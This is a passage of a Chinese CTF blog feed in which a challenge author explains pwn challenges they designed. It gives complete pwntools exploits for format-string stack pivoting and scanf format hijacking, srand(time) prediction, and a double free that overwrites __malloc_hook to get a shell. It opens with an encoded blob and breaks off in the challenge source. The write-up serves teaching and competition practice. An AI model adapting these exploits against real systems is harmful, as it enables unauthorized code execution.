QnA9CJ/hMlctiTmed8SK3WQCrH1S3w3aaFbSUxzcCIogpaGR9xO7aYn/bPJc0TQTDR2E9gV2kTWCweE4aVSAkIPFhQ6/OeuKDMvX95sath+wNPsoCNbCn+V4Ad3xuK3VA0N+Ft9P46xd2wLogIDCblLvJE6sFakZGkylGF7mbYkjXch7BI8XIhiCUdAIpqsFa/tit0LSWZlUlDI6Zs37RxV1f/Wb0xsGOfyDtgwARW+yhh8pVnWCHfGkPaiDIshD9ZpJCiMYA/qSgfLwd2Dw/A1poApbUYWkU9MVUv5RjNP92K2T5czFIca61wyOulQ6Z58tmdLdIs56Wi6FSdMwYmaVd2nZDnwa86uK449TniH0wjkg07Q5gi6cU9ufNq2ZmC3CQqyAA3pmWXafbN8MqKYQweJKDDiuSUKQ2/A09blKJqcRvk+eKANSSUBwYks7t59C/WUWkcH2EMiNPAoa7I8ANJiyD8+AHDT2YGbk0i8mTzHxRlxVZd9g/sBxTaqJCcplLE0NOAHxEuJCASiO5sVVzoz99uucma3ZqUK2JhUZSVtcZmbjVy+z5IMAR0+2JPgcXqunN5Ygc//1djcZAVvwI2N4TwadBZdt91su+QGOoBzbpILTUuuWuzFtxSQm1jw+ONV6wU2y5pa/qq/PDPpDoU8iB4CVv2rq7ezFq7jZhQ2c9bAnAUp/Zq26osurSgQUjOED2TW9RhY8RfW2Mlrh4IGUi9cNB6JIS5DXKMmUnTp2S/RipiW8pi3XD8S4adDIfJUO0SpC7KrvMuIG22i39iYqkKND/BF/VspaW/SApHOcZFK4C4cyPRewtgXZxMFbvSo/+2PgKCA+jdYyRnOfwhMeilEwUYq8LNMCgMj//baLqQ1LURKPjxj90myofCsoD6UNCwxBNUb5lJ6K50qmltYu7m6mPFORSbvhglNwbDx3GPRgF/nZ7x/2IJky4JLd7lamVAp7PEX4BcXkka6w+NO0Jb0DgNhStWGd1iHW+IGxa2I3GTh25PuFLAq7KEtdiRIrLmwKhyzJFOve/P+u5QLlAcRw1BYV1oAnSHN+UgRN2uSEuDavJFG4vip6uw/w0zO2y/F5YudPTAD31UhK+mbVaqb8P3ANFKnIafvSj13xvw8dFgcTpXPnIn6MY7VZeo5yq/lRxivAmIs2wY4pQknkxCp9jMGhK8QC+lJdRTbZYMMV5pQxEz5JPkjmwx7B1V0yk2eY5B0cq5EUbSpfxBt1iuAgEu+siL40ChLMaJk7ycN/L7latRiM4xlFoYax7NlFo/g47gPshnmn+NQilo647PvXq9QQpZNoZQ+rbvpJ17U9tJCex+/LSrQf5ydCRgbpOIDr4Xr/jLj+TI9llkjQ4auWufYI+QFd5DTvL7hkgV6baO5ke0/Lz1/oIbMrIXb41oYhzZouHJYgYszWRsvKJNUDEYE7ouZVMYWLiLjEeL4/OdEWfpNFIamrJGR/58msrW6a42FMhofjUM9ONUxKC+cp4nReg04rj0MPE4YCM3M9pv4m2FDzBLLv6XYhETNsXDYhf6m/NCSv3FMcyS76JHTwMpZ0hvR++U+vtLAo0RnjuD+9FdiDaUbZ2j0gy75rGM0GXbVLz4FmUfPm0+sT7EYP/82bzhKkV8zmWCjgXl6V5I3jHsh9f9aMwcwHimi+gtIDkZ48yi0IXOKqV6iC9uYnf8IwnIUszNctouShN7FuGTP4D7DkY6bxyTvETo28XDGBR7CjfufoAMD57wzwRAvRuLGLSp00DLFzPN9cWT9OlWRrar1w03PW/KreO660TNc6889vFG1eoNOg6JPE6X9k++wOvJdWhDVUrNfvhDUUsHOJzhSLP3KGqTEARrQlhR3Yayf3SkMQ==]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记]]></title>
    <url>%2F2018%2F06%2F25%2Fpwnhub_Panda's_gift%2F</url>
    <content type="text"><![CDATA[胖哈勃Panda’s gift出题题目分析题目在main函数中首先提高了栈地址，去掉了部分栈地址随机化（后2字节），便于后续利用。 在init函数中，利用时间作为随机数种子，使用mmap伪随机生成2个内存块，地址可预测。作为题目中visitor_name、motto两个变量的可使用内存。 在login函数中，提供了三个功能。1. 向visitor_name赋值，长度最大为6字节。 2. 向motto赋值，长度最大为0x100字节。 3.打印motto的值。 上述三个功能由一个全局变量flag控制每个功能仅能调用一次。 漏洞设置1、 利用libc及固定时间，visitor_name、motto地址可预测。 2、 在login的set_name函数中，设置了一个6字节的格式化字符串漏洞，且漏洞仅能利用一次。 漏洞利用首先，题目在编译时开启了RELRO、NX、CANARY保护，使得got表不可写、不能通过简单溢出利用漏洞。 地址预测在链接远程服务器时同时启动脚本，利用python的cdll库与服务器同样的libc可以达到预测的两个地址的效果，如： 1234567891011121314if not debug: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2 printf格式化字符串利用因为题目本身仅存在一个显式漏洞，只能从该漏洞入手。 由于仅给了6字节的格式化字符串利用，因此考虑用%hn对rbp链写\x0000。 在0x400d31下断点后，可以看到栈结构如下： 1234567800:0000│ rbp rsp 0x7ffc5dc00110 —▸ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 ◂— ...01:0008│ 0x7ffc5dc00118 —▸ 0x400d47 ◂— nop 02:0010│ 0x7ffc5dc00120 —▸ 0x7ffc5dc00150 —▸ 0x7ffc5dc00180 —▸ 0x7ffc5df09410 ◂— ...03:0018│ 0x7ffc5dc00128 —▸ 0x400eba ◂— jmp 0x400f4b04:0020│ 0x7ffc5dc00130 ◂— 0x005:0028│ 0x7ffc5dc00138 ◂— 0x100400bf806:0030│ 0x7ffc5dc00140 —▸ 0x4010bc ◂— and eax, 0x6e610064 /* &apos;%d&apos; */07:0038│ 0x7ffc5dc00148 ◂— 0xcc345db59e141600 当向rsp所指的位置利用 %6$hn 可以使得在函数返回到login函数时，login的rbp寄存器的后2字节被清零，造成栈迁移。而login函数在调用scanf函数时，使用rbp对格式化字符串寻址： 12345.text:0000000000400E0C mov rax, [rbp+var_10].text:0000000000400E10 mov rsi, rdx.text:0000000000400E13 mov rdi, rax.text:0000000000400E16 mov eax, 0.text:0000000000400E1B call __isoc99_scanf 因此，可以控制scanf格式化字符串的地址。 scanf格式化字符串控制上一条讲了printf格式化字符串利用方法，而在调用printf格式化字符串前，可以利用set_motto函数预先在栈上布置好相关的地址。 tip: 在出题时，我选择用抬高栈的方法使得使用printf格式化字符串利用后修改的rbp一定能落在set_motto使用过的栈中，set_motto从0xxxxxfffd0开始写入到0xxxxx00110结束，但由于栈是复用的，通过对题目调整，使得0xxxxxfffd0 - 0xxxxxffff8是不被栈的复用覆盖的。因此能保证做题时可以劫持栈地址，进一步劫持scanf格式化字符串 在set_motto函数中填入 ‘scanf格式字符串’.ljust(0x20,’0’) + motto的地址，可以将scanf的格式化字符串劫持为用户输入的格式化字符串。且仅有0x20长度 由于栈上没有可以控制数据，所以并不能对内存地址任意写。 scanf的处理特性是按照每一个参数顺序处理的，因此利用栈上的rbp链（第10个参数、第16个参数分别是两个函数栈的ebp位置）特性，构造’%dq%10\$pq%16\$pq\0’，可以达到任意写且能保证正常逻辑不崩溃的目的。 地址泄露当前已经可以构造内存任意写了，任意写劫持motto指针为got地址，可以泄露libc地址。 1p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q') 由于flag变量限制，每个函数仅能调用1次，不能继续泄露了，所以对flag置零 1p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q') 使用libc中的environ环境变量，可以泄露栈地址 1p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q') 劫持控制流由于存在canary，直接栈溢出不能用的，此时劫持控制流可以通过修改调用 text:0000000000400E1B call __isoc99_scanf 处的返回地址，相当于函数自修改返回地址，将其修改为one_gadget，就可以拿到shell了。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./babyfmt')if debug: p= process('./babyfmt') context.log_level = 'debug' libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b *0x400d31\nb *0x400e1b\n')else: p = remote('127.0.0.1', 9999)#process('./pwn1') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') libc_run = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc_run.srand(libc_run.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b *0x400e1b\n')v2 = 0while (v2 &lt;= 0x10000 ): v2 = libc_run.rand() &amp; 0xFFFFF000;visitor_name = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL);v2 = 0;while ((v2 &lt;= 0x10000 )|(visitor_name == v2)): v2 = libc_run.rand() &amp; 0xFFFFF000;motto = v2#mmap((void *)(signed int)v2, 0x1000uLL, 3, 34, -1, 0LL); print '[+] motto ',hex(motto) p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')p.sendline('%dq%10$pq%16$pq\0'.ljust(0x20)+p64(motto))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(elf.got['puts'])+'q')libc.address = u64(p.recv(6).ljust(8,'\0') )- libc.symbols['puts']print "[+] system",hex(libc.symbols['system'])p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')p.recvuntil('&gt;')p.sendline('3q'+hex(0x602058)+'q'+hex(libc.symbols['environ'])+'q')#p.sendline('1q'+hex(libc.symbols['__malloc_hook'])+'q'+hex(libc.address +0x4526a ))#add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))stack = u64(p.recv(6).ljust(8,'\0') ) &amp;0xfffffffffff00000 -0x300000print "[+] stack",hex(stack)p.recvuntil('&gt;')p.sendline('1q'+hex(0x602050)+'q'+hex(0)+'q')#p.recvuntil('&gt;')#p.sendline('1q'+hex(motto+12)+'q'+hex(0x007073303824))p.recvuntil('&gt;')p.sendline('1q'+hex(stack+0x128)+'q'+hex(libc.address+0x4526a)+'q')p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' ##other 比赛网址 题目链接 ， 密码： 7nb6 在*ctf 2018里出现过一道scanf格式字符串的利用，那题比较没有canary，使用%256s就溢出执行rop了。见到考察自构格式化字符串的比较少，所以搞了一题，利用思路和bss段上的printf格式化字符串是类似的，结合printf和scanf搞了一个格式化字符串漏洞大礼包。在编译题目时对栈重新构造了一下，避免了做题去碰随机化的尴尬，在scanf格式化字符串长度那里可以再减小一点，我用了15个字节，在题目中预留了32字节的长度。 由于自己太菜了，忘了libc函数是没有canary保护的，在劫持scanf格式化字符串那里本身就可以劫持scanf的返回地址写ROP了，失去了后面跳板构造内存任意写的作用了，如果那里有canary的话只能按照预期的方法来做了。 拿到一血、二血的test_for_pwn、Swings 大佬都是用这个非预期出的，觉得还是有点失落，但大佬们还是真的很强。 不过，这次比赛名称用了Panda’s gift真的是比较暖心了，虽然题目被非预期了，但是还是学到了很多东西。 TSCTF 2018 FINAL PWN1 Writeup此题中留了3处可以获得flag的点 伪随机数预测题目中留了一个black-jack游戏，代码参考了pwnable.kr中题目的代码，但里面的漏洞和逻辑bug被我修复了，每一轮游戏可以下注，当达到一定分数时，可以拿到加密后的flag，此题问题在于初始化中调用了srand(time(0)/60)作为伪随机种子，只要在与服务器上程序启动的一分钟以内去生成随机数都是可以正确预测随机数的。相当于可以预测扑克牌生成的序列，当预测到这一轮电脑会赢的时候就下注$1，预测自己会赢的话就全部下注，过不了几轮就可以拿到加密后的flag，解密就可以了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174#coding:utf-8from pwn import *import timefrom ctypes import *debug=1last = list()ori = -1elf = ELF('./DNS_Server')if debug: libc=CDLL("/lib/x86_64-linux-gnu/libc.so.6") libc.srand(libc.time(0)/60) p= process('./DNS_Server') context.log_level = 'debug' #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') #gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def randcard(dealer): global last,ori if len(last)&gt;0: num = last[0]%13+1 last = last[1:] else: ori = libc.rand() num = ori%13+1 if num &gt;= 12: num = 10 elif num == 11: if dealer&lt;=10: num = 11 else: num = 1 else: num = num return numdef round(): global ori player = 0 dealer = 0 player_flag = 0 dealer_flag = 0 Hit = 0 Stay = 0 getrand()#,last player+=randcard(player) #print '--' p.recvuntil('Your Total is ') tmp =int(p.recvline()[:-1]) if (tmp!= player): print '[-] rand num1 wrong !with %d vs %d'%(tmp,player) exit(0) p.recvuntil('The Dealer Has a Total of ') dealer+=randcard(dealer) tmp =int(p.recvline()[:-1]) if (tmp!= dealer): print '[-] rand num2 wrong !%d vs %d'%(tmp,dealer) exit(0) while(1): if player == 21: #print '[+++]1 d,p',dealer,player,last return 1,Hit,Stay if player&lt;=21: if player_flag!=1: card_type = getrand() card_num = randcard(player) if (player + card_num )&lt;=21: player+=card_num Hit +=1 else: last.append(card_type) last.append(ori) player_flag =1 Stay = 1 if dealer&lt;17: dealer += randcard(dealer) if dealer==21: #print '[+++]2 d,p',dealer,player,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]3 d,p',dealer,player ,last return 1,Hit,Stay else: if dealer&lt;17: dealer += randcard(dealer) if dealer&gt;=17: if player&gt;=dealer: #print '[+++]4 d,p',dealer,player ,last return 1,Hit,Stay if player&lt;dealer: #print '[+++]5 d,p',dealer,player ,last return 0,Hit,Stay if dealer&gt;21: #print '[+++]6 d,p',dealer,player ,last return 1,Hit,Stay # (p.recvuntil(Your Total is ))def getrand(): global last_two,last if len(last)&gt;0: num = last[0] last = last[1:] #print '[***]',last else: num = libc.rand() return numwin = 0p.recvuntil('&gt;')p.sendline(str(0xbabe)) p.recvuntil('Y/N')p.sendline('Y')p.recvuntil("Choice:")p.sendline('1')while 1: ''' if win&gt;=6: p.recvuntil('flag :') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) ''' if ")b" in p.recvuntil(":"): p.recvuntil('flag :\n') flag = p.recv() flag_decrypt = "" for i in range(len(flag)): flag_decrypt += chr((getrand()%256)^ord(flag[i])) print flag_decrypt exit(0) p.recvuntil(' $') money = int(p.recvline()[:-1]) result,hit,stay = round() if result : p.recvuntil("$") p.sendline(str(money)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") #win+=1 else: p.recvuntil("$") p.sendline(str(1)) for i in range(0,hit): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("H") for i in range(0,stay): p.recvuntil("Please Enter H to Hit or S to Stay.") p.sendline("S") p.recvuntil('Please Enter Y for Yes or N for No\n') p.sendline('Y')p.interactive() Double Free题目中有一个增加DNS和删除DNS的功能，在删除功能中按照domain名进行查找并Free，但仅把最后一个DNS节点指针置空，因此，两次Delete会造成Double Free。但是题目中我设置了一个坑点，在于DNS节点Free以前会检查是否是当前用户释放的，也就是name字段，当简单的double free时，由于fd指针位置已经被置为某地址了，所以不能通过检查而释放，此时发现检查字段用的是strcmp来比较的，将name字段设置为‘\x00’*7即可通过检查。比较简单的libc泄露地址方法是用unsorted bin未清空来做，泄露main_arena+88这个地址。以后的方法是常规套路：将Double Free转换为UAF，形成循环链表，劫持长度为0x70的fastbin链到__malloc_hook-0x30，以one_gadget覆写__malloc_hook，在申请堆块时候触发malloc从而拿到shell。 另外，堆漏洞由于我写错了一个函数，出现了一个堆溢出漏洞，膜一发以非预期解法解出题目的师傅 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *import timedebug=1elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p)else: p = remote('172.16.20.11', 2111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)p.recvuntil("&gt;")p.sendline('1')p.recvuntil('&gt;')p.sendline('1')p.recvuntil("name")p.sendline('\0'*6)p.recvuntil("&gt;")p.sendline('4')add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b'))#raw_input()add("step1",0x40,"p4nda","...".ljust(0x20,'1'))add("step1",0x40,"p4nda","...".ljust(0x20,'1'))delete("step1")delete("step1")delete("leak")#raw_input()add("step2",0x40,"p4nda",(p64(libc.symbols['__malloc_hook']-0x23)+"...").ljust(0x20,'1'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))add("step3",0x40,"p4nda","...".ljust(0x20,'3'))#raw_input()add("step4",0x40,"p4nda",("\0"*0x13+p64(libc.address +0x4526a )+"...".ljust(0x20,'0')))p.recvuntil("&gt;")p.sendline("2")p.interactive()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' 格式化字符串大礼包在set_name函数中有一个明显的格式化字符串漏洞，这个漏洞很多队伍拿来做地址泄露了，实际上也是可用的。首先七个字节，可用来写本函数中的rbp，向该位置用%hn写2字节\x00。在写完之后，在login函数的栈就被迁移到原来的栈的低地址位置了，而在set_motto函数中可以对这部分内存预先设置一下，可以达到控制scanf格式化字符串的目的，将这个格式化字符串劫持到堆上去，泄露堆地址的方法与Double Free中泄露方法是一致的，达到控制格式化字符串以后，需要考虑如何将scanf的格式化字符串用好。与格式化字符串在堆或bss段上的printf格式化字符串利用思路类似，可以在栈上先找一个地址链，向第一个地址写入，再对第二个地址写入，从而达到任意地址写，最终劫持puts@got 为system，以show_motto函数触发漏洞就可以拿到shell了。 利用流程是：以堆泄露libc、堆地址-&gt;在堆上预先布置好scanf格式化字符串-&gt;以set_motto预先布置好栈上数据-&gt;调用set_name对login函数做栈迁移-&gt;利用login函数的scanf写got表-&gt;触发show_motto函数拿到shell 这个就是一个简化版本的胖哈勃题目，出在这里想看一下有什么解法是我非预期的，当时线下赛的时候没有人用这个方法来做，还是没有想到上面提到的那个劫持返回地址… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#coding:utf-8from pwn import *import timedebug=0elf = ELF('./DNS_Server')if debug: p= process('./DNS_Server') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'b set_motto\nb set_name')else: p = remote('172.16.20.17', 40111)#process('./pwn1') libc = ELF('./libc-2.23.so')def add(domain,length,remark,ip): p.recvuntil("&gt;") p.sendline("2") p.recvuntil("domain:") p.sendline(domain) p.recvuntil("length") p.sendline(str(length)) p.recvuntil("remark:") p.sendline(remark) p.recvuntil("IP:") p.send(ip)def delete(domain): p.recvuntil("&gt;") p.sendline("4") p.recvuntil("domain:") p.sendline(domain)def show(domain): p.recvuntil("&gt;") p.sendline("3") p.recvuntil("domain:") p.sendline(domain)def leak(): add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) add("leak",0x100,"p4nda","...12345".ljust(0x20,'b')) add("padding",0x100,"p4nda","...12345".ljust(0x20,'b')) delete("leak") show("leak")leak()p.recvuntil("IP : ")libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols["__malloc_hook"]print '[+] system:',hex(libc.symbols['system'])p.recvuntil("IP : ")heap =u64(p.recv(4).ljust(8,'\0'))print '[+] heap:',hex(heap)add("fmt",0x50,"%dp4nda%10$pp4nda%16$pp4nda\0","...".ljust(0x20,'c'))p.recvuntil('&gt;')p.sendline('1') p.recvuntil('&gt;')p.sendline('2')p.recvuntil('motto:')for i in range(0,8): if(((heap+48)&gt;&gt;(8*i))&amp;0xff) ==0x0a: print "bad addr" exit(0)p.sendline('/bin/sh\0'+'a'*(0xf0-0x10-8)+p64(heap+48))p.recvuntil('&gt;')p.sendline('1')p.recvuntil('name')p.sendline('%6$hn')p.recvuntil("&gt;")p.sendline("3p4nda"+hex(elf.got['puts'])+"p4nda"+hex(libc.symbols['system'])+'p4nda')p.recvuntil('motto')p.sendline('p4nda')p.interactive() 题目源码include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt; //Used for srand((unsigned) time(NULL)) command//#include &lt;process.h&gt; //Used for system("cls") command #define spade 35 //Used to print spade symbol#define club 36 //Used to print club symbol#define diamond 37 //Used to print diamond symbol#define heart 38 //Used to print heart symbol#define RESULTS "Blackjack.txt" //File name is Blackjack#define WIN_SUM 65535 struct DNS_Node&#123; char user[8]; char domain[0x30]; char *ptr;&#125;;//Global Variablesint k;int l;int d;int won;int loss;int cash = 5;unsigned int bet;int random_card;int player_total=0;int dealer_total=0;char * visitor_name ;int login_flag=0;char * motto=0;struct DNS_Node *DNS_Node_List[0x20];//Function Prototypesint clubcard(); //Displays Club Card Imageint diamondcard(); //Displays Diamond Card Imageint heartcard(); //Displays Heart Card Imageint spadecard(); //Displays Spade Card Imageint randcard(); //Generates random cardint betting(); //Asks user amount to betvoid asktitle(); //Asks user to continuevoid rules(); //Prints "Rules of Vlad's Blackjack" menuvoid play(); //Plays gamevoid dealer(); //Function to play for dealer AIvoid stay(); //Function for when user selects 'Stay'void cash_test(); //Test for if user has cash remaining in pursevoid askover(); //Asks if user wants to continue playingvoid fileresults(); //Prints results into Blackjack.txt file in program directory//Main Functionint game(void)&#123; int choice1; puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); printf("\n"); printf("\n"); printf("\n 222 111 "); printf("\n 222 222 11111 "); printf("\n 222 222 11 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n"); printf("\n%c%c%c%c%c %c%c %c%c %c%c%c%c%c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c%c%c%c%c %c%c %c %c%c %c %c %c %c ", club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c%c%c%c %c %c %c%c %c ", club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club); printf("\n%c %c %c%c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, club, club); printf("\n%c %c %c%c %c %c %c %c %c %c ", club, club, spade, spade, diamond, diamond, heart, heart, club, club); printf("\n%c%c%c%c%c%c %c%c%c%c%c%c%c %c %c %c%c%c%c%c %c %c ", club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club); printf("\n"); printf("\n 21 "); printf("\n %c%c%c%c%c%c%c%c %c%c %c%c%c%c%c %c %c ", diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c %c ", diamond, diamond, heart, heart, club, club, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c %c %c %c %c ", diamond, diamond, heart, heart, heart, heart, club, spade, spade); printf("\n %c%c %c %c%c%c%c %c %c %c%c %c ", diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade); printf("\n %c%c %c %c %c %c %c ", diamond, diamond, heart, heart, club, spade, spade); printf("\n %c %c%c %c %c %c %c %c %c ", diamond, diamond, diamond, heart, heart, club, spade, spade); printf("\n %c%c%c %c %c %c%c%c%c%c %c %c ", diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade); printf("\n"); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222 111 "); printf("\n 222222222222222 111111111111111 "); printf("\n 2222222222222222 11111111111111111 "); printf("\n"); puts("-*-*-*-*-*首家线上赌场上线了，性感泽哥女装发牌(・∀・)つ *-*-*-*-*-"); printf("\n"); asktitle(); printf("\n"); printf("\n"); //system("pause"); return(0);&#125; //end program void asktitle() // Function for asking player if they want to continue&#123; char choice1; int choice2; printf("\n Are You Ready?"); printf("\n ----------------"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; //system("clear"); printf("\nEnter 1 to Begin the Greatest Game Ever Played."); printf("\nEnter 2 to See a Complete Listing of Rules."); printf("\nEnter 3 to Exit Game. (Not Recommended)"); printf("\nChoice: "); scanf("%d", &amp;choice2); // Prompts user for choice if((choice2&lt;1) || (choice2&gt;3)) // If invalid choice entered &#123; printf("\nIncorrect Choice. Please enter 1, 2 or 3\n"); scanf("%d", &amp;choice2); &#125; switch(choice2) // Switch case for different choices &#123; case 1: // Case to begin game // system("clear"); play(); break; case 2: // Case to see rules // system("clear"); rules(); break; case 3: // Case to exit game printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); break; default: printf("\nInvalid Input"); &#125; // End switch case &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; printf("\nYour day could have been perfect."); printf("\nHave an almost perfect day!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void rules() //Prints "Rules of Vlad's Blackjack" list&#123; char choice1; int choice2; printf("\n RULES of VLAD's BLACKJACK"); printf("\n ---------------------------"); printf("\nI."); printf("\n Thou shalt not question the odds of this game."); printf("\n %c This program generates cards at random.", spade); printf("\n %c If you keep losing, you are very unlucky!\n", diamond); printf("\nII."); printf("\n Each card has a value."); printf("\n %c Number cards 1 to 10 hold a value of their number.", spade); printf("\n %c J, Q, and K cards hold a value of 10.", diamond); printf("\n %c Ace cards hold a value of 11", club); printf("\n The goal of this game is to reach a card value total of 21.\n"); printf("\nIII."); printf("\n After the dealing of the first two cards, YOU must decide whether to HIT or STAY."); printf("\n %c Staying will keep you safe, hitting will add a card.", spade); printf("\n Because you are competing against the dealer, you must beat his hand."); printf("\n BUT BEWARE!."); printf("\n %c If your total goes over 21, you will LOSE!.", diamond); printf("\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n", spade, heart, club, club, heart, spade); printf("\nWould you like to go the previous screen? (I will not take NO for an answer)"); printf("\n (Y/N)\n "); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; 